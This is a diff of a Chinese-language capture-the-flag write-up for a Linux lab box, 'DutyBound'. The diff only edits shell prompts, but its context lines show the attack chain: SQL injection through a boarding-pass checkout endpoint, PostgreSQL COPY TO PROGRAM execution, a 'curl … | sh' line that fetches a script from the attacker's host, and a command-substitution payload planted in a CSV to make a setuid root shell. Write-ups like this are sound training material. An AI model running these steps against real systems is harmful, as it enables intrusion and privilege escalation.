@@ -36,7 +36,7 @@ DutyBound 是一台围绕机场免税店自助结账机搭建的 Linux 靶机。
 全端口扫描只开放 SSH 与 HTTP：
 
 ```console
-$ nmap -Pn -n -p- --min-rate 2000 -T4 --open 10.129.20.205
+imawuya:~$ nmap -Pn -n -p- --min-rate 2000 -T4 --open 10.129.20.205
 PORT    STATE SERVICE
 22/tcp  open  ssh
 80/tcp  open  http
@@ -46,7 +46,7 @@ PORT    STATE SERVICE
 版本探测：
 
 ```console
-$ nmap -Pn -n -sV -sC -p 22,80,443 10.129.20.205
+imawuya:~$ nmap -Pn -n -sV -sC -p 22,80,443 10.129.20.205
 22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.18
 80/tcp  open  http     nginx 1.18.0 (Ubuntu)
 443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
@@ -140,7 +140,7 @@ M1DOE/JOHN            EABC1234LHRJFKB00 0123 123Y012A0001A
 最后一段的条件块内容不是按参数绑定的，而是直接拼进 SQL 字符串。在块的自由区放一个单引号，就能让数据库报语法错误并把语句回显出来：
 
 ```console
-$ curl -sk -b cj.txt -X POST -H 'Content-Type: application/json' \
+imawuya:~$ curl -sk -b cj.txt -X POST -H 'Content-Type: application/json' \
     --data-binary @payload.json https://airsnacks.htb/checkout/boarding-pass/verify
 {"detail":"syntax error at or near \";\"\nLINE 1: ...'', 241, 'AAAAAAAAAAAAAAAAAAAAAAAAAAA2   2026BB00';--       ..."}
 ```
@@ -164,7 +164,7 @@ PostgreSQL 的 `COPY … TO PROGRAM` 可以直接拉起 shell 命令。用 `')--
 ```
 
 ```console
-$ tail -1 httpd.log
+imawuya:~$ tail -1 httpd.log
 10.129.20.205 - - "GET /H_dWlkPTExNChwb3N0Z3Jlcyk... HTTP/1.1" 404 -
 ```
 
@@ -191,7 +191,7 @@ curl -s 10.10.17.46:8000/k.sh|sh
 脚本以 dutyfree-kiosk 身份执行，把 `id` 和 `user.txt` 复制到 `/tmp` 并放开权限：
 
 ```console
-$ id
+dutyfree-kiosk@dutybound:~$ id
 uid=1000(dutyfree-kiosk) gid=1000(dutyfree-kiosk) groups=1000(dutyfree-kiosk),1001(pos-ops)
 ```
 
@@ -226,14 +226,14 @@ echo '$(cp /bin/bash /tmp/rb;chmod 4755 /tmp/rb),1,1' >> /opt/vrs/data/duty-rate
 几秒后文件出现：
 
 ```console
-$ ls -la /tmp/rb
+postgres@dutybound:~$ ls -la /tmp/rb
 -rwsr-xr-x 1 root root 1396520 /tmp/rb
 ```
 
 用 postgres 的通道执行即可拿到 root：
 
 ```console
-$ /tmp/rb -p -c 'id; cat /root/root.txt'
+postgres@dutybound:~$ /tmp/rb -p -c 'id; cat /root/root.txt'
 uid=114(postgres) gid=121(postgres) euid=0(root) ...
 ```
 
